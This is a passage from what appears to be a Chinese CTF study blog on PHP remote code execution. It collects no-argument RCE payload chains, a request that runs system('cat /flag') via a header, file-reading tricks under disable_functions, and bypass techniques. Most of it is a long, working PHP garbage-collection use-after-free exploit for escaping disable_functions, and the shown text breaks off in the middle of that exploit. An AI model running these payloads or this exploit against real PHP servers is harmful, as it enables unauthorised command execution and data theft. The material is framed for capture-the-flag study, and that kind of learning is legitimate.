    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;
&lt;&#x2F;form&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>抓包构造执行命令,在上传文件内容添加sh命令</p>
<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">?c&#x3D;.+&#x2F;???&#x2F;????????[@-[]（通配符匹配大写字母）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">文件内容
#!&#x2F;bin&#x2F;sh
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ol>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="PHP无参rce"><a href="#PHP无参rce" class="headerlink" title="PHP无参rce"></a>PHP无参rce</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/123690383?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%97%A0%E5%8F%82rce&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-123690383.nonecase&spm=1018.2226.3001.4187">参考文章</a></p>
<blockquote>
<p>依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
</blockquote>
<p>核心</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="php函数直接读取文件"><a href="#php函数直接读取文件" class="headerlink" title="php函数直接读取文件"></a>php函数直接读取文件</h3><p>payload例</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p><strong>localeconv()函数</strong></p>
<blockquote>
<p>返回一包含本地数字及货币格式信息的数组</p>
</blockquote>
<p>第一个返回的是点，可利用的点就是代表当前目录，可以结合其他函数进行目录扫描</p>
</li>
<li><p><strong>scandir()函数</strong></p>
<blockquote>
<p>目录扫描</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">// 查看当前目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p><strong>chdir()函数</strong></p>
<blockquote>
<p>跳目录</p>
</blockquote>
<p>向上跳就要构造chdir(‘…’)</p>
</li>
<li><p><strong>array_reverse()函数</strong></p>
<blockquote>
<p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p>
</blockquote>
</li>
<li><p><strong>highlight_file()&#x2F;show_source()函数</strong></p>
<blockquote>
<p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p>
</blockquote>
<p>被过滤时：<code>print(file_get_contents())</code></p>
</li>
<li><p><strong>reset()函数</strong></p>
<blockquote>
<p>表示内部指针指向数组的第一个元素并输出</p>
</blockquote>
</li>
<li><p><strong>next()函数</strong></p>
<blockquote>
<p>表示内部指针指向数组的下一个元素，并输出</p>
</blockquote>
</li>
<li><p>打印时flag被包含可加上<code>base64_encode()</code></p>
</li>
</ul>
<h3 id="使用session-start-session-id-读取文件"><a href="#使用session-start-session-id-读取文件" class="headerlink" title="使用session_start()+session_id()读取文件"></a>使用session_start()+session_id()读取文件</h3><blockquote>
<p>注意 php&lt;7</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>index<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="通过dirname-实现任意文件读取"><a href="#通过dirname-实现任意文件读取" class="headerlink" title="通过dirname()实现任意文件读取"></a>通过dirname()实现任意文件读取</h3><blockquote>
<p>使用它对目录进行执行的话就会返回上级目录</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="使用getallheaders-函数进行命令执行"><a href="#使用getallheaders-函数进行命令执行" class="headerlink" title="使用getallheaders()函数进行命令执行"></a>使用getallheaders()函数进行命令执行</h3><blockquote>
<p>getallheaders()函数可以获取所有的HTTP标头</p>
</blockquote>
<p>由于包的请求头信息可控，如果能够执行我们指定的请求头内容，就能实现代码执行</p>
<p>利用函数指向我们需要的请求头元素，用eval在对应的请求头元素进行命令执行即可</p>
<p>比如：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?star=eval(next(getallheaders()));</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">test:70</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">system('cat /flag');</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时UA头是getallheaders()返回的数组的第二个元素，利用next指向它，用eval进行命令执行即可</p>
<h3 id="使用get-defined-vars"><a href="#使用get-defined-vars" class="headerlink" title="使用get_defined_vars()"></a>使用get_defined_vars()</h3><blockquote>
<p>返回由所有已定义变量所组成的数组，会按顺序返回<code>$_GET</code>，<code>$_POST</code>，<code>$_COOKIE</code>，<code>$_FILES</code></p>
</blockquote>
<p>示例：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span>：<span class="token operator">?</span>code<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token constant">POST</span>：<span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<hr>
<h2 id="突破-disable-functions-禁用函数"><a href="#突破-disable-functions-禁用函数" class="headerlink" title="突破 disable_functions 禁用函数"></a>突破 disable_functions 禁用函数</h2><blockquote>
<p>尝试执行某些函数返回 <code>xx has been disabled for security reasons</code> 说明 php.ini 配置中 disable_functions 禁用了对应的执行系统外部命令函数，但是我们可以用php内置函数来读取文件</p>
</blockquote>
<p>这几个函数实际上也可以被 ban，所以需要尝试 fuzz 找到可用的方法</p>
<h3 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印"></a>输出打印</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_export</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">scandir('.')
glob('*')


?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token comment">// glob://伪协议结合原生类列目录</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source();
highlight_file();
file_get_contents();
include();
require();

?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 原生类读文件</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h3 id="RCE-Bypass"><a href="#RCE-Bypass" class="headerlink" title="RCE Bypass"></a>RCE Bypass</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p>
<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p><a href="/blog/2023/10/15/LD-PRELOAD%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8/#%E7%BB%95disabled-function">见LD_PRELOAD劫持利用</a></p>
<hr>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p>条件：PHP安装并启用了 pcntl 插件</p>
<p><code>pcntl_exec()</code>是 pcntl 插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序</p>
<p>注意，此函数无回显</p>
<p>相关题目：<a href="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/#%E7%BB%95disable-function">红明谷2024 noauth</a></p>
<hr>
<h4 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h4><p>利用php的垃圾回收的漏洞实现绕过安全目录</p>
<p>版本：<br>7.0 - all versions to date<br>7.1 - all versions to date<br>7.2 - all versions to date<br>7.3 - all versions to date</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>
            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>
            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>
                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
